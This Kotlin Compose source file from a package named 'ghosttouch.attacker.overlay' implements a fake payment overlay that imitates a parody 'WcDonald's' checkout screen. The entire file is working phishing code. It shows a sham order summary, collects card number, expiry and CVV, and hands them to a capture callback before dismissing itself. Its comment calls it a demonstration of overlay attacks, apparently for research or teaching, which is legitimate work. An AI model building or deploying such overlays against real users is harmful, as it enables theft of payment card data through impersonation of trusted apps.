package com.ghosttouch.attacker.overlay

import android.util.Log
import androidx.compose.foundation.background
import androidx.compose.foundation.layout.*
import androidx.compose.foundation.shape.RoundedCornerShape
import androidx.compose.foundation.text.KeyboardOptions
import androidx.compose.material.icons.Icons
import androidx.compose.material.icons.filled.CreditCard
import androidx.compose.material.icons.filled.DateRange
import androidx.compose.material.icons.filled.Lock
import androidx.compose.material3.*
import androidx.compose.runtime.*
import androidx.compose.ui.Alignment
import androidx.compose.ui.Modifier
import androidx.compose.ui.graphics.Color
import androidx.compose.ui.text.font.FontWeight
import androidx.compose.ui.text.input.KeyboardType
import androidx.compose.ui.unit.dp
import androidx.compose.ui.unit.sp
import kotlinx.coroutines.delay
import kotlinx.coroutines.launch

/**
 * Fake payment overlay that mimics the WcDonald's payment screen.
 *
 * This overlay captures card details entered by the user, demonstrating
 * how financial data can be stolen through overlay attacks.
 *
 * @param onPaymentCaptured Callback with card number, expiry, and CVV.
 * @param onDismiss Callback when the overlay should be removed.
 */
@Composable
fun FakePaymentOverlay(
    onPaymentCaptured: (cardNumber: String, expiry: String, cvv: String) -> Unit,
    onDismiss: () -> Unit
) {
    val wcRed = Color(0xFFDA291C)
    val wcWhite = Color(0xFFFFFFFF)
    val wcBackground = Color(0xFFFAFAFA)
    val wcGray = Color(0xFFF5F5F5)

    var cardNumber by remember { mutableStateOf("") }
    var expiry by remember { mutableStateOf("") }
    var cvv by remember { mutableStateOf("") }
    var cardHolder by remember { mutableStateOf("") }
    val coroutineScope = rememberCoroutineScope()

    Box(
        modifier = Modifier
            .fillMaxSize()
            .background(wcBackground)
    ) {
        Column(modifier = Modifier.fillMaxSize()) {
            // Fake top bar
            Box(
                modifier = Modifier
                    .fillMaxWidth()
                    .statusBarsPadding()
                    .height(64.dp)
                    .background(wcRed),
                contentAlignment = Alignment.CenterStart
            ) {
                Text(
                    "Payment",
                    color = wcWhite,
                    fontSize = 20.sp,
                    modifier = Modifier.padding(start = 56.dp)
                )
            }

            Column(
                modifier = Modifier
                    .fillMaxWidth()
                    .padding(24.dp),
                verticalArrangement = Arrangement.spacedBy(16.dp)
            ) {
                Text(
                    "Order Summary",
                    fontSize = 20.sp,
                    fontWeight = FontWeight.Bold
                )

                // Fake order summary
                Card(
                    modifier = Modifier.fillMaxWidth(),
                    shape = RoundedCornerShape(12.dp),
                    colors = CardDefaults.cardColors(containerColor = wcGray)
                ) {
                    Column(modifier = Modifier.padding(16.dp)) {
                        Row(Modifier.fillMaxWidth(), Arrangement.SpaceBetween) {
                            Text("WcBurger Deluxe", fontSize = 14.sp)
                            Text("$8.99", fontSize = 14.sp)
                        }
                        Row(Modifier.fillMaxWidth(), Arrangement.SpaceBetween) {
                            Text("Large Fries", fontSize = 14.sp)
                            Text("$3.49", fontSize = 14.sp)
                        }
                        Row(Modifier.fillMaxWidth(), Arrangement.SpaceBetween) {
                            Text("WcFlurry", fontSize = 14.sp)
                            Text("$4.29", fontSize = 14.sp)
                        }
                        HorizontalDivider(modifier = Modifier.padding(vertical = 8.dp))
                        Row(Modifier.fillMaxWidth(), Arrangement.SpaceBetween) {
                            Text("Total", fontWeight = FontWeight.Bold, fontSize = 16.sp)
                            Text("$16.77", fontWeight = FontWeight.Bold, fontSize = 16.sp)
                        }
                    }
                }

                Text(
                    "Card Details",
                    fontSize = 16.sp,
                    fontWeight = FontWeight.Bold
                )

                OutlinedTextField(
                    value = cardHolder,
                    onValueChange = { cardHolder = it },
                    label = { Text("Cardholder Name") },
                    singleLine = true,
                    modifier = Modifier.fillMaxWidth(),
                    shape = RoundedCornerShape(12.dp)
                )

                OutlinedTextField(
                    value = cardNumber,
                    onValueChange = {
                        if (it.length <= 16) cardNumber = it.filter { c -> c.isDigit() }
                    },
                    label = { Text("Card Number") },
                    leadingIcon = { Icon(Icons.Default.CreditCard, contentDescription = null) },
                    keyboardOptions = KeyboardOptions(keyboardType = KeyboardType.Number),
                    singleLine = true,
                    modifier = Modifier.fillMaxWidth(),
                    shape = RoundedCornerShape(12.dp)
                )

                Row(horizontalArrangement = Arrangement.spacedBy(12.dp)) {
                    OutlinedTextField(
                        value = expiry,
                        onValueChange = { if (it.length <= 5) expiry = it },
                        label = { Text("MM/YY") },
                        leadingIcon = { Icon(Icons.Default.DateRange, contentDescription = null) },
                        singleLine = true,
                        modifier = Modifier.weight(1f),
                        shape = RoundedCornerShape(12.dp)
                    )
                    OutlinedTextField(
                        value = cvv,
                        onValueChange = {
                            if (it.length <= 3) cvv = it.filter { c -> c.isDigit() }
                        },
                        label = { Text("CVV") },
                        leadingIcon = { Icon(Icons.Default.Lock, contentDescription = null) },
                        keyboardOptions = KeyboardOptions(keyboardType = KeyboardType.Number),
                        singleLine = true,
                        modifier = Modifier.weight(1f),
                        shape = RoundedCornerShape(12.dp)
                    )
                }

                Spacer(modifier = Modifier.height(8.dp))

                Button(
                    onClick = {
                        val capturedCard = cardNumber
                        val capturedExpiry = expiry
                        val capturedCvv = cvv
                        Log.d("FakePaymentOverlay", "Capturing: card=*${capturedCard.takeLast(4)}, exp=$capturedExpiry")
                        onPaymentCaptured(capturedCard, capturedExpiry, capturedCvv)
                        coroutineScope.launch {
                            delay(500)
                            onDismiss()
                        }
                    },
                    modifier = Modifier
                        .fillMaxWidth()
                        .height(52.dp),
                    shape = RoundedCornerShape(12.dp),
                    colors = ButtonDefaults.buttonColors(containerColor = wcRed),
                    enabled = cardNumber.length == 16 && cvv.length == 3 && expiry.isNotBlank()
                ) {
                    Text("Pay $16.77", fontSize = 16.sp, fontWeight = FontWeight.SemiBold)
                }
            }
        }
    }
}
